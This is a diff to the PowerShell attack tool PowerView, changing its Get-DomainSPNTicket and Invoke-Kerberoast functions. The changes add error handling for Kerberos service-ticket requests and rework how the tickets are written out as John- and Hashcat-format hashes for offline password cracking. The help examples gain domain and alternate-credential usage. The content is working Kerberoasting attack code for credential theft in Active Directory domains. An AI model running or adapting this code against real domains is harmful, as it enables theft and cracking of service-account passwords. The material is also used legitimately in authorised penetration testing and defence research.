@@ -2305,7 +2305,12 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $UserSPN = $UserSPN[0]
             }
 
-            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            try {
+                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            }
+            catch {
+                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName'"
+            }
             if ($Ticket) {
                 $TicketByteStream = $Ticket.GetRequest()
             }
@@ -2322,11 +2327,13 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
                 if ($OutputFormat -match 'John') {
-                    $HashFormat = "`$krb5tgs`$unknown:$Hash"
+                    $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                 }
                 else {
+                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+
                     # hashcat output format
-                    $HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdsa,DC=pf,DC=fakedomain,DC=com SPN: E0518235-4B06-11D1-AB04-00C04FDS3CD2-BADM/aksjdb.asdsa.pf.fakedomain.com:50000 *' + $Hash
+                    $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
@@ -2413,15 +2420,22 @@ for connection to the target domain.
 
 Invoke-Kerberoast | fl
 
+Kerberoasts all found SPNs for the current domain.
+
 .EXAMPLE
 
-Invoke-Kerberoast -Domain dev.testlab.local | fl
+Invoke-Kerberoast -Domain dev.testlab.local -OutputFormat HashCat | fl
+
+Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
+format instead of John (the default).
 
 .EXAMPLE
 
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
-Invoke-Kerberoast -Credential $Cred -Verbose | fl
+Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
+
+Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
 
 .OUTPUTS
 
